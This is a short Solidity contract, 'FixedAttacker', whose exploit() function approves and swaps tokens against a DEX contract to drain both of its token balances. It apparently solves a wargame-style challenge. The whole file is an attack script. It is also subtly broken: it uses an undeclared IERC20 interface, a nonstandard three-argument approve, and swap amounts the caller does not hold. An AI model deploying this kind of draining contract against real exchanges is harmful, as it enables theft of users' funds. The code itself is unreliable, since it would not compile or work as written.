pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address account) external view returns (uint);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address owner, address spender, uint256 amount) external;
}


interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function balanceOf(address token, address account) external view returns (uint);
    function swap(address from, address to, uint amount) external;
}


contract FixedAttacker {
    address immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function exploit() external {
        IDex dex = IDex(instance);
        address token1Address = dex.token1();
        address token2Address = dex.token2();

        uint token1Dex = IERC20(token1Address).balanceOf(instance);
        uint token2Dex = IERC20(token2Address).balanceOf(instance);

        // 1. Approve contracts to the Dex using custom 3-arg function
        IToken(token2Address).approve(msg.sender, address(dex), token2Dex);
        dex.swap(token2Address, token1Address, token2Dex);

        // 2. Drain second swap in reverse
        uint newToken1Dex = IERC20(token1Address).balanceOf(instance);
        IToken(token1Address).approve(msg.sender, address(dex), newToken1Dex);
        dex.swap(token1Address, token2Address, newToken1Dex);
    }
}
